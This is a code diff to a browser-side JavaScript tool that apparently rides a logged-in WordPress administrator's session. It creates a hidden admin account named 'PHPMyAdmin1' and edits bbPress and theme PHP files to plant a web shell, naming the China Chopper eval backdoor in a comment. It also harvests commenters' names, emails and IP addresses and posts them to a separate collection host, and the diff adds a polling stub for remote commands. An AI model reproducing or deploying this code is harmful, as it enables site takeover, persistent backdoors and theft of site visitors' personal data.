@@ -4,17 +4,23 @@ var g_strURLIndex="";
 var g_strURLLogin="";
 var g_strURLAddUser="";
 var g_strURLComment="";
+var g_strURLPanelIndex="";
 var g_strURLEditPHPPostPlugin="";
 var g_strURLEditPHPPostTheme="";
 var g_strURLEditPHPArray=null;
 var g_strUsername="";
 var g_strComunication="";
+
+var g_strURLVisitLogsAdd="";
+var g_strURLCommentsAdd="";
+var g_strURLSpysIndex="";
 function initURL()
 {
     g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
     g_strURLLogin=Common.getTargetHost()+"wp-login.php";
+    g_strURLPanelIndex=Common.getTargetHost()+"wp-admin/index.php";
     g_strURLEditPHPArray=new Array();
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Findex.php&plugin=bbpress%2Fbbpress.php";
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Fincludes%2Findex.php&plugin=bbpress%2Fbbpress.php";
@@ -23,6 +29,9 @@ function initURL()
     g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
     g_strURLEditPHPPostPlugin=Common.getTargetHost()+"wp-admin/plugin-editor.php";
     g_strURLEditPHPPostTheme=Common.getTargetHost()+"wp-admin/theme-editor.php";
+
+    g_strURLVisitLogsAdd=Common.getJSHost()+"visit-logs/add2";
+    g_strURLCommentsAdd=Common.getJSHost()+"Comments/add";
 }
 
 //find the give child
@@ -44,6 +53,30 @@ function findChild($element,array)
     }
     return $elementReturn;
 }
+//--------------------------------------------panelIndex page-----------------------------------------------------------------------
+function inPagePanelIndex()
+{
+    var iIDTimer=window.setInterval
+    (
+        function()
+        {
+            $.ajax
+            (
+                {
+                    type:"post",
+                    url:"",
+                    data:{},
+                    success:function(data,textStatus,xhr)
+                    {
+
+                    }
+                }
+            );
+        },60000
+    );
+}
+//--------------------------------------------panelIndex page-----------------------------------------------------------------------
+
 //--------------------------------------------editPHP page-----------------------------------------------------------------------
 function inPageEditPHP() {
     //check URL again
@@ -60,12 +93,12 @@ function inPageEditPHP() {
     var strURLPost="";
     if(window.location.href.indexOf("wp-admin/theme-editor.php")!==-1)
     {   //theme
-        jsonToSend.plugin=$("#template").find("input[name='plugin']").val();
+        jsonToSend.theme=$("#template").find("input[name='theme']").val();
         strURLPost=g_strURLEditPHPPostTheme;
     }
     else if(window.location.href.indexOf("wp-admin/plugin-editor.php")!==-1)
     {   //plugin
-        jsonToSend.theme=$("#template").find("input[name='theme']").val();
+        jsonToSend.plugin=$("#template").find("input[name='plugin']").val();
         strURLPost=g_strURLEditPHPPostPlugin;
     }
     else
@@ -88,18 +121,47 @@ function inPageEditPHP() {
                 };
                 try
                 {
-                    if(data.indexOf("Thank you for updating")!==-1)
+                    var bEditSuccess=false;
+                    //bbPress plugin
+                    if(window.location.href.indexOf("plugin=bbpress")!==-1)
                     {
-                        console.log("edit phpfile success:"+$("#template").find("input[name='file']").val());
-                        json.action+="success";
-                        throw "success";
+                        if(data.indexOf("id=\"template\"")===-1)
+                        {
+                            bEditSuccess=true;
+                        }
+                        else
+                        {
+                            bEditSuccess=false;
+                        }
+                    }
+                    //goodnews theme
+                    else if(window.location.href.indexOf("theme=goodnews5")!==-1)
+                    {
+                        if(data.indexOf("id=\"message\"")!==-1)
+                        {
+                            bEditSuccess=true;
+                        }
+                        else
+                        {
+                            bEditSuccess=false;
+                        }
                     }
                     else
                     {
-                        console.log("edit phpfile failed:"+$("#template").find("input[name='file']").val());
-                        json.action+="failed";
-                        throw "failed";
+                        console.log("fatal error in function inPageEditPHP,unrecognized url:"+window.location.href);
                     }
+                    var strResult="";
+                    if(bEditSuccess)
+                    {
+                        strResult="success";
+                    }
+                    else
+                    {
+                        strResult="failed";
+                    }
+                    console.log("edit phpfile "+strResult+":"+$("#template").find("input[name='file']").val());
+                    json.action+=strResult;
+                    throw strResult;
                 }
                 catch(e)
                 {
@@ -120,14 +182,25 @@ function inPageEditPHP() {
 
 
 //--------------------------------------------comment page-----------------------------------------------------------------------
-function inPageComment()
+function inPageComment(iRowIndex)
 {
     var $elementTable=$("#the-comment-list");
+    var jsonLog=
+    {
+        username:window.parent.g_strUsername,
+        action:""
+    };
     if($elementTable.length>0)
     {
-        for(var i=0;i<$elementTable.children().length;++i)
+        //for(var i=0;i<$elementTable.children().length;++i)
+        //{
+        if(iRowIndex<0)
         {
-            var $elementTableRow=$elementTable.children().eq(i);
+            iRowIndex=0;
+        }
+        if(iRowIndex<$elementTable.children().length)
+        {
+            var $elementTableRow=$elementTable.children().eq(iRowIndex);
             //author basic info，author email site ip
             var $elementAuthorBasic=$elementTableRow.find("td.author.column-author");
             if($elementAuthorBasic.length!=1)
@@ -136,7 +209,7 @@ function inPageComment()
             }
             var author=$elementAuthorBasic.children().eq(0).text();
             var site=$elementAuthorBasic.children().eq(2).text();
-            var email=$elementAuthorBasic.children().eq(4).texxt();
+            var email=$elementAuthorBasic.children().eq(4).text();
             var ip=$elementAuthorBasic.children().eq(6).text();
             //content
             var $elementContent=$elementTableRow.find("td.comment.column-comment.has-row-actions.column-primary");
@@ -158,12 +231,12 @@ function inPageComment()
             {
                 throw "back to element number is not equal 1,it is:"+$elementTime.length;
             }
-            var time=$elementTime.children().eq(0).texxt();
+            var time=$elementTime.children().eq(0).text();
             $.ajax
             (
                 {
                     type:"post",
-                    url:Common.getJSHost()+"Comments/add",
+                    url:g_strURLCommentsAdd,
                     data:
                     {
                         postauthor:author,
@@ -181,52 +254,60 @@ function inPageComment()
                             var json=eval("("+data+")");
                             if(json.success)
                             {
-                                console.log("add comment success");
+                                throw "success";
                             }
                             else
                             {
-                                console.log("add comment failed");
+                                throw "failed";
                             }
                         }
                         catch(e)
                         {
-                            console.log("add comment exception:"+e);
+                            if(e!="success"&&e!="failed")
+                            {
+                                console.log("add comment exception:"+e);
+                            }
+                            else
+                            {
+                                console.log("add comment result:"+e);
+                            }
+                            //next row
+                            iRowIndex++;
+                            inPageComment(iRowIndex);
                         }
                     }
                 }
             );
         }
-        //total pages
-        var iTotal=$(".total-pages").eq(0).text();
-        //current page
-        var iCurrent=$("#current-page-selector").val();
-        //check if there is next page
-        if(iTotal===iCurrent)
-        {
-            //no more
-            window.parent.g_strComunication="";
-            var json=
-            {
-                username:window.parent.g_strUsername,
-                action:"capture comment finish,count:"+$elementTable.children().length
-            };
-            addVisitLog(json);
-        }
         else
         {
             //next page
-            window.parent.g_strComunication=$("a.next-page").eq(0).attr("href");
-            var json=
+            //total pages
+            var iTotal=$(".total-pages").eq(0).text();
+            //current page
+            var iCurrent=$("#current-page-selector").val();
+            //check if there is next page
+            if(iTotal===iCurrent)
             {
-                username:window.parent.g_strUsername,
-                action:"capture comment and going to next page,count:"+$elementTable.children().length
-            };
-            addVisitLog(json);
+                //no more
+                window.parent.g_strComunication="";
+                jsonLog.action="capture comment finish,count:"+$elementTable.children().length;
+            }
+            else
+            {
+                //next page
+                window.parent.g_strComunication=$("a.next-page").eq(0).attr("href");
+                jsonLog.action="capture comment and going to next page,count:"+$elementTable.children().length;
+            }
+            addVisitLog(jsonLog);
         }
+        //}
     }
     else
     {
-        console.log("can not get element table");
+        jsonLog.action="fatal error in function inPageComment:can not get element table";
+        console.log(jsonLog.action);
+        addVisitLog(jsonLog);
     }
 }
 //--------------------------------------------comment page-----------------------------------------------------------------------
@@ -267,6 +348,7 @@ function inPageAddUser()
                 data:
                 {
                     "action":"createuser",
+                    "createuser":$("#createuser").find("#createusersub").val(),
                     "_wpnonce_create-user":$("#_wpnonce_create-user").val(),
                     "_wp_http_referer":"/wp-admin/user-new.php",
                     "user_login":"PHPMyAdmin1",
@@ -293,7 +375,7 @@ function inPageAddUser()
                     try
                     {
 
-                        if(data.indexOf("id=\"createusersub\"")===0)
+                        if(data.indexOf("id=\"createusersub\"")===-1)
                         {
                             console.log("add user success");
                             json.action="add user success";
@@ -403,12 +485,14 @@ function inPageIndex()
         //alert("find child");
         var $elementUsername=findChild($("#wpadminbar"),[1,1,1,0]);
         json.username=$elementUsername.text();
+        json.action+=",user login already:"+json.username;
         window.parent.g_strUsername=json.username;
         window.parent.g_strComunication="login_already";
     }
     else
     {   //not login
         window.parent.g_strComunication="not_login";
+        json.action+=",user not login";
     }
     addVisitLog(json);
 }
@@ -421,7 +505,7 @@ function addVisitLog(json)
     (
         {
             type:"post",
-            url:Common.getJSHost()+"visit-logs/add2",
+            url:g_strURLVisitLogsAdd,
             data:json,
             success:function(data,textStatus)
             {
@@ -540,24 +624,28 @@ function frameOperationCalledFromSon(windowSon)
         if(g_strComunication!=="")
         {
             //next page
+            console.log("going to crawl next page comments:"+g_strComunication);
             frameJumpTo(g_strComunication);
         }
         else
         {
             //no more comment
-            alert("no more comment!");
+            //alert("no more comment!");
+            frameJumpTo(g_strURLPanelIndex);
         }
     }
     else if(windowSon.location.href===g_strURLAddUser)
     {
         if(g_strComunication==="no_privilege")
         {   // has no privileges,i need comment
+            console.log("detect can not create user due to lack of privileges,try to crawl comment ..");
             frameJumpTo(g_strURLComment);
         }
         else if(g_strComunication==="has_privilege")
         {
             //if has privilege i need php edit
             //<?php @eval($_POST['caidao']);?>
+            console.log("detect create user success,try to eidt php ..");
             g_strComunication=0;
             frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
         }
@@ -573,11 +661,13 @@ function frameOperationCalledFromSon(windowSon)
         {
             //no more php to edit,i need comment
             frameJumpTo(g_strURLComment);
+            console.log("detect not more php file to edit,going to crawl comments:"+g_strURLComment);
         }
         else
         {
             //next php to edit
             frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
+            console.log("going to next editable php file:"+g_strURLEditPHPArray[g_strComunication]);
         }
     }
     else if(window.location.href.indexOf("wp-login.php?redirect_to")!==-1)
@@ -613,10 +703,15 @@ function frameOperation()
     {
         inPageEditPHP();
     }
-    else if(window.location.href===g_strURLComment)
+    else if(window.location.href.indexOf(g_strURLComment)!==-1)
     {
         //get back comment
-        inPageComment();
+        inPageComment(-1);
+    }
+    else if(window.location.href==g_strURLPanelIndex)
+    {
+        //get changable js command
+        inPagePanelIndex();
     }
     else if(window.location.href.indexOf("wp-login.php?redirect_to")!==-1)
     {
